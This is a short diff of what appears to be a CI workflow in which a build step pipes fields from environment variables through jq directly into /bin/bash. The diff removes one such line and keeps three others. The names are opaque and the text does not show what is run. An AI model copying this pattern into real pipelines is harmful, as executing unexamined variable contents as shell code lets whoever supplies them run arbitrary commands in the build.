@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$qa0145" | jq -r .yoz0692 | /bin/bash
           printf '%s' "$t37" | jq -r .z70002 | /bin/bash
-          printf '%s' "$exvh50" | jq -r .mjx24528 | /bin/bash
           printf '%s' "$airm175" | jq -r .vcm4559 | /bin/bash
 
       - name: Save output
